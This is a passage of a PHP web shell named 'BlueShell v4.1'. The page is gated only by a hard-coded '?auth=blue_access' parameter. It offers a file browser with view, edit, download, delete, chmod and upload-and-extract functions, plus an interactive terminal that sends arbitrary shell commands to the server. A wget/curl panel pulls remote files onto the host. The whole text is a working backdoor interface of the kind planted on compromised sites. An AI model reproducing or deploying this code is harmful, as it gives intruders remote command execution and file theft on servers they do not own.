                    <a href="?auth=blue_access&path=<?= urlencode($built) ?>" class="path-item <?= $i === count($parts)-1 ? 'path-current' : '' ?>">
                        <?= htmlspecialchars($part ?: '/') ?>
                    </a>
                    <?php if ($i < count($parts)-1): ?>
                        <span class="path-sep">/</span>
                    <?php endif; ?>
                <?php endforeach; ?>
            </div>

            <div class="toolbar">
                <button class="btn btn-primary" onclick="showModal('upload')">📤 Upload File</button>
                <button class="btn btn-success" onclick="showModal('zip')">📦 Upload ZIP</button>
                <button class="btn" onclick="showModal('folder')">📁 New Folder</button>
                <button class="btn" onclick="showModal('file')">📄 New File</button>
                <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search files..." onkeyup="searchFiles(this.value)">
            </div>

            <table class="file-table" id="fileTable">
                <thead>
                    <tr><th>Name</th><th width="100">Size</th><th width="100">Perms</th><th width="150">Modified</th><th width="300">Actions</th></tr>
                </thead>
                <tbody>
                    <?php if ($current_path !== getcwd()): ?>
                    <tr><td colspan="5"><a href="?auth=blue_access&path=<?= urlencode(dirname($current_path)) ?>" class="file-name"><span class="file-icon">📁</span><span>.. (Parent Directory)</span></a></td></tr>
                    <?php endif; ?>
                    <?php
                    $items = scandir($current_path);
                    $dirs = [];
                    $files = [];
                    foreach ($items as $item) {
                        if ($item === '.' || $item === '..') continue;
                        $full = $current_path . '/' . $item;
                        if (is_dir($full)) $dirs[] = $item;
                        else $files[] = $item;
                    }
                    sort($dirs);
                    sort($files);
                    foreach (array_merge($dirs, $files) as $item):
                        $full = $current_path . '/' . $item;
                        $is_dir = is_dir($full);
                        $size = $is_dir ? '--' : formatBytes(filesize($full));
                        $perms = substr(sprintf('%o', fileperms($full)), -4);
                        $modified = date('Y-m-d H:i:s', filemtime($full));
                        $icon = $is_dir ? '📁' : getFileIcon($item);
                    ?>
                    <tr>
                        <td>
                            <?php if ($is_dir): ?>
                                <a href="?auth=blue_access&path=<?= urlencode($full) ?>" class="file-name">
                                    <span class="file-icon"><?= $icon ?></span>
                                    <span><?= htmlspecialchars($item) ?></span>
                                </a>
                            <?php else: ?>
                                <a href="?auth=blue_access&view=<?= urlencode($full) ?>" class="file-name">
                                    <span class="file-icon"><?= $icon ?></span>
                                    <span><?= htmlspecialchars($item) ?></span>
                                    <span class="file-size">(<?= $size ?>)</span>
                                </a>
                            <?php endif; ?>
                        </td>
                        <td><?= $size ?></td>
                        <td><span class="perms-badge"><?= $perms ?></span></td>
                        <td><?= $modified ?></td>
                        <td class="action-btns">
                            <?php if (!$is_dir): ?>
                                <a href="?auth=blue_access&view=<?= urlencode($full) ?>" target="_blank" class="action-btn">👁️ View</a>
                                <a href="?auth=blue_access&edit=<?= urlencode($full) ?>" class="action-btn">✏️ Edit</a>
                                <a href="?auth=blue_access&download=<?= urlencode($full) ?>" class="action-btn">⬇️ Download</a>
                            <?php endif; ?>
                            <button class="action-btn" onclick="renameItem('<?= htmlspecialchars(addslashes($item)) ?>')">📝 Rename</button>
                            <button class="action-btn" onclick="chmodItem('<?= htmlspecialchars(addslashes($item)) ?>', '<?= $perms ?>')">🔐 Chmod</button>
                            <a href="?auth=blue_access&delete=<?= urlencode($item) ?>&path=<?= urlencode($current_path) ?>" class="action-btn delete-btn" onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">🗑️ Delete</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
             </table>

            <div class="system-info">
                <div class="info-item"><span class="info-label">💾 Free Space:</span><span><?= disk_free_space($current_path) ? formatBytes(disk_free_space($current_path)) : 'N/A' ?></span></div>
                <div class="info-item"><span class="info-label">📁 Total Items:</span><span><?= count($dirs) + count($files) ?></span></div>
                <div class="info-item"><span class="info-label">📁 Writable:</span><span><?= is_writable($current_path) ? '✅' : '❌' ?></span></div>
                <div class="info-item"><span class="info-label">🕒 Server Time:</span><span><?= date('Y-m-d H:i:s') ?></span></div>
            </div>
        </div>

        <!-- Terminal Tab -->
        <div id="terminal-tab" class="tab-content">
            <div class="terminal">
                <div class="terminal-header">
                    <span class="terminal-title">⚡ Interactive Terminal</span>
                    <span class="terminal-cwd" id="currentCwd"><?= htmlspecialchars($current_path) ?></span>
                </div>
                <div class="terminal-output" id="terminalOutput">
                    <pre>BlueShell v4.1 - Enhanced Interactive Terminal Ready</pre>
                    <pre>Commands: ls, pwd, whoami, wget, curl, etc.</pre>
                </div>
                <div class="terminal-input-area">
                    <span class="terminal-prompt">$</span>
                    <input type="text" class="terminal-input" id="cmdInput" placeholder="Enter command..." autofocus>
                    <button class="btn btn-primary" onclick="runCommand()">Run</button>
                    <button class="btn" onclick="clearTerminal()">Clear</button>
                    <button class="btn btn-danger" onclick="stopCommand()">⏹️ Stop</button>
                </div>
                <div class="quick-cmds">
                    <span class="quick-cmd" onclick="setCommand('ls -la')">ls -la</span>
                    <span class="quick-cmd" onclick="setCommand('pwd')">pwd</span>
                    <span class="quick-cmd" onclick="setCommand('whoami')">whoami</span>
                    <span class="quick-cmd" onclick="setCommand('id')">id</span>
                    <span class="quick-cmd" onclick="setCommand('wget --help')">wget --help</span>
                    <span class="quick-cmd" onclick="setCommand('curl --version')">curl --version</span>
                    <span class="quick-cmd" onclick="setCommand('php -v')">php -v</span>
                    <span class="quick-cmd" onclick="setCommand('uname -a')">uname -a</span>
                    <span class="quick-cmd" onclick="setCommand('df -h')">df -h</span>
                    <span class="quick-cmd" onclick="setCommand('free -m')">free -m</span>
                </div>
            </div>
            
            <!-- WGET Panel -->
            <div class="wget-panel">
                <span style="color: var(--primary-light);">🌐 Wget Download:</span>
                <input type="text" id="wgetUrl" class="wget-input" placeholder="https://example.com/file.zip">
                <button class="btn btn-primary" onclick="runWget()">Download File</button>
            </div>
        </div>

        <!-- Upload & ZIP Tab -->
        <div id="upload-tab" class="tab-content">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                <div style="background: rgba(10, 30, 10, 0.85); border-radius: 16px; border: 1px solid rgba(76,175,80,0.5); padding: 25px; backdrop-filter: blur(10px);">
                    <h3 style="color: var(--primary-light); margin-bottom: 20px;">📤 Upload File</h3>
                    <form method="POST" enctype="multipart/form-data" id="uploadForm">
                        <input type="file" name="upload" class="modal-input" required>
                        <button type="submit" class="btn btn-primary" style="width: 100%;">Upload File</button>
                    </form>
                </div>
                <div style="background: rgba(10, 30, 10, 0.85); border-radius: 16px; border: 1px solid rgba(76,175,80,0.5); padding: 25px; backdrop-filter: blur(10px);">
                    <h3 style="color: var(--primary-light); margin-bottom: 20px;">📦 Upload & Extract ZIP</h3>
                    <form method="POST" enctype="multipart/form-data" id="zipForm">
                        <input type="file" name="zip_upload" accept=".zip,.rar,.7z,.tar.gz" class="modal-input" required>
                        <input type="text" name="extract_path" class="modal-input" placeholder="Extract to (optional)">
                        <button type="submit" class="btn btn-success" style="width: 100%;">Upload & Extract</button>
                    </form>
                </div>
            </div>
        </div>
        <?php endif; ?>
    </div>

    <!-- Modals -->
    <div class="modal" id="uploadModal"><div class="modal-content"><div class="modal-title">📤 Upload File</div><form method="POST" enctype="multipart/form-data"><input type="file" name="upload" class="modal-input" required><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('upload')">Cancel</button><button type="submit" class="btn btn-primary">Upload</button></div></form></div></div>
    <div class="modal" id="zipModal"><div class="modal-content"><div class="modal-title">📦 Upload ZIP</div><form method="POST" enctype="multipart/form-data"><input type="file" name="zip_upload" accept=".zip,.rar,.7z,.tar.gz" class="modal-input" required><input type="text" name="extract_path" class="modal-input" placeholder="Extract to"><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('zip')">Cancel</button><button type="submit" class="btn btn-success">Upload</button></div></form></div></div>
    <div class="modal" id="folderModal"><div class="modal-content"><div class="modal-title">📁 New Folder</div><form method="POST"><input type="text" name="new_folder" class="modal-input" placeholder="Folder name" required><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('folder')">Cancel</button><button type="submit" class="btn btn-primary">Create</button></div></form></div></div>
    <div class="modal" id="fileModal"><div class="modal-content"><div class="modal-title">📄 New File</div><form method="POST"><input type="text" name="new_file" class="modal-input" placeholder="Filename" required><textarea name="content" class="modal-textarea" placeholder="File content..."></textarea><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('file')">Cancel</button><button type="submit" class="btn btn-primary">Create</button></div></form></div></div>
    <div class="modal" id="renameModal"><div class="modal-content"><div class="modal-title">📝 Rename</div><form method="POST"><input type="hidden" name="old_name" id="oldName"><input type="text" name="new_name" class="modal-input" id="newName" required><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('rename')">Cancel</button><button type="submit" name="rename" class="btn btn-primary">Rename</button></div></form></div></div>
    <div class="modal" id="chmodModal"><div class="modal-content"><div class="modal-title">🔐 Change Permissions</div><form method="POST"><input type="hidden" name="chmod_file" id="chmodFile"><input type="text" name="permissions" class="modal-input" id="chmodPerms" placeholder="755" pattern="[0-7]{3,4}" required><div class="modal-buttons"><button type="button" class="btn" onclick="hideModal('chmod')">Cancel</button><button type="submit" name="chmod" class="btn btn-primary">Apply</button></div></form></div></div>

    <script>
        let currentPath = <?= json_encode($current_path) ?>;
        let searchTimeout;
        let currentAjaxRequest = null;

        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
            document.getElementById(tabName + '-tab').classList.add('active');
            if (tabName === 'terminal') document.getElementById('cmdInput').focus();
        }

        function showModal(type) { document.getElementById(type + 'Modal').style.display = 'flex'; }
        function hideModal(type) { document.getElementById(type + 'Modal').style.display = 'none'; }
        function renameItem(oldName) { document.getElementById('oldName').value = oldName; document.getElementById('newName').value = oldName; showModal('rename'); }
        function chmodItem(file, perms) { document.getElementById('chmodFile').value = file; document.getElementById('chmodPerms').value = perms; showModal('chmod'); }
        
        function searchFiles(query) {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                const filter = query.toLowerCase();
                document.querySelectorAll('#fileTable tbody tr').forEach(row => {
                    row.style.display = row.textContent.toLowerCase().includes(filter) ? '' : 'none';
                });
            }, 300);
        }

        function runWget() {
            const url = document.getElementById('wgetUrl').value.trim();
            if (!url) {
                alert('Please enter a URL to download');
                return;
            }
            const filename = url.split('/').pop();
            const cmd = `wget -O "${filename}" "${url}" 2>&1 || curl -L -o "${filename}" "${url}" 2>&1`;
            document.getElementById('cmdInput').value = cmd;
            runCommand();
            document.getElementById('wgetUrl').value = '';
        }

        function runCommand() {
            const cmd = document.getElementById('cmdInput').value.trim();
            if (!cmd) return;
            const output = document.getElementById('terminalOutput');
            output.innerHTML += '<pre>$ ' + escapeHtml(cmd) + '</pre>';
            const loadingDiv = document.createElement('pre');
            loadingDiv.innerHTML = '<span style="color: #ffb74d;">⏳ Executing...</span>';
            output.appendChild(loadingDiv);
            output.scrollTop = output.scrollHeight;
            if (currentAjaxRequest) currentAjaxRequest.abort();
            currentAjaxRequest = new XMLHttpRequest();
            currentAjaxRequest.open('POST', '?auth=blue_access', true);
            currentAjaxRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            currentAjaxRequest.timeout = 120000;
            currentAjaxRequest.onload = function() {
                loadingDiv.remove();
                if (currentAjaxRequest.status === 200) {
                    try {
                        const data = JSON.parse(currentAjaxRequest.responseText);
                        if (data.cwd) { currentPath = data.cwd; document.getElementById('currentCwd').textContent = currentPath; }
                        const pre = document.createElement('pre');
                        let outputText = data.output && data.output.trim() ? data.output : '<span style="color: #ffb74d;">(no output)</span>';
                        pre.innerHTML = escapeHtml(outputText);
                        output.appendChild(pre);
                        if (cmd.includes('wget') || cmd.includes('curl')) {
                            setTimeout(() => { location.reload(); }, 1000);
                        }
                    } catch(e) { output.innerHTML += '<pre style="color:#ef9a9a;">Parse error: ' + e.message + '</pre>'; }
                } else { output.innerHTML += '<pre style="color:#ef9a9a;">Request failed: ' + currentAjaxRequest.status + '</pre>'; }
                output.scrollTop = output.scrollHeight;
                currentAjaxRequest = null;
            };
            currentAjaxRequest.ontimeout = function() { loadingDiv.remove(); output.innerHTML += '<pre style="color:#ef9a9a;">Timeout (120s)</pre>'; currentAjaxRequest = null; };
            currentAjaxRequest.onerror = function() { loadingDiv.remove(); output.innerHTML += '<pre>Network error</pre>'; currentAjaxRequest = null; };
            currentAjaxRequest.send('ajax=cmd&cmd=' + encodeURIComponent(cmd) + '&cwd=' + encodeURIComponent(currentPath));
            document.getElementById('cmdInput').value = '';
        }

        function stopCommand() { if (currentAjaxRequest) { currentAjaxRequest.abort(); currentAjaxRequest = null; document.getElementById('terminalOutput').innerHTML += '<pre>⏹️ Stopped</pre>'; } }
        function setCommand(cmd) { document.getElementById('cmdInput').value = cmd; runCommand(); }
        function clearTerminal() { document.getElementById('terminalOutput').innerHTML = '<pre>BlueShell v4.1 Ready</pre><pre>Commands: ls, pwd, whoami, wget, curl, etc.</pre>'; document.getElementById('cmdInput').focus(); }
        function escapeHtml(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }

        document.getElementById('cmdInput')?.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); runCommand(); } });
        window.onclick = e => { if (e.target.classList?.contains('modal')) e.target.style.display = 'none'; };
        setTimeout(() => { document.querySelectorAll('.message').forEach(m => { m.style.opacity = '0'; setTimeout(() => m.remove(), 500); }); }, 5000);
    </script>
</body>
</html>
